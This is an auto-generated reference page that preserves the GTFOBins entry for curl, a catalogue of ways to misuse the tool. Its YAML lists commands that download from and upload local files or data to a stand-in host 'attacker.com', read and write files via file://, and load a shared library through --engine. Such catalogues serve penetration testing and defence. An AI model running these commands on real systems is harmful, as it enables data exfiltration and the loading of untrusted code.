---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# curl

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `curl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [curl](../../tools/linux/curl.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | curl |
| name | curl |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/curl/ |

## Preserved Source Material

```yaml
_body: ''
_name: curl
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/curl
functions:
  download:
  - code: curl http://attacker.com/path/to/input-file -o /path/to/output-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: http-server
  file-read:
  - code: curl file:///path/to/input-file
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: 'echo DATA >/path/to/temp-file

      curl file:///path/to/temp-file -o /path/to/output-file'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  library-load:
  - code: curl --engine /path/to/lib.so x
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  upload:
  - code: curl -X POST --data-binary @/path/to/input-file http://attacker.com
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: http-server
  - code: curl -X POST --data-binary DATA http://attacker.com
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: http-server
  - code: curl gopher://attacker.com:12345/_DATA
    comment: Data will be `\r\n` terminated.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: tcp-server
```
